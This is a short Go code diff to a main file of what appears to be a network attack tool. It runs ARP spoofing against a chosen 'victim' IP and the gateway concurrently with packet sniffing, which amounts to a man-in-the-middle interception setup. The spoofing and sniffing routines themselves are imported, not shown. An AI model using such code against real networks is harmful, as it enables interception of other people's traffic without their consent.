@@ -6,10 +6,12 @@ import (
 	"net"
 	"os"
 	"os/signal"
+	"sync"
 	"syscall"
 
 	"github.com/KennyZ69/netBr/pkg"
 	ipkg "github.com/KennyZ69/netBr/pkg/ip"
+	"github.com/KennyZ69/netBr/sniff"
 	"github.com/KennyZ69/netBr/spoof"
 )
 
@@ -78,6 +80,7 @@ func main() {
 	fmt.Println("Active IPs:", activeIPs)
 
 	targetIP := chooseVictimIP(activeIPs)
+	fmt.Println("Chosen target", targetIP.String())
 
 	gatewayMAC, err := pkg.GetMacFromIP(net.ParseIP(cfg.Gateway), cfg.NetIfi)
 	if err != nil {
@@ -88,9 +91,24 @@ func main() {
 		log.Fatalf("Error getting target MAC addr: %s\n", err)
 	}
 
+	var wg sync.WaitGroup
+
 	handleExit(cfg.NetIfi, targetIP, net.ParseIP(cfg.Gateway), targetMAC, gatewayMAC)
 
-	spoof.SpoofARP(cfg.NetIfi, targetIP, net.ParseIP(cfg.Gateway), net.HardwareAddr(cfg.Mac), targetMAC, gatewayMAC)
+	wg.Add(1)
+	go func() {
+		defer wg.Done()
+		spoof.SpoofARP(cfg.NetIfi, targetIP, net.ParseIP(cfg.Gateway), net.HardwareAddr(cfg.Mac), targetMAC, gatewayMAC)
+
+	}()
+
+	wg.Add(1)
+	go func() {
+		defer wg.Done()
+		sniff.Sniff(cfg.NetIfi, cfg.Mac, targetIP.String(), cfg.Gateway)
+	}()
+
+	wg.Wait()
 }
 
 func chooseVictimIP(activeIPs []net.IP) net.IP {
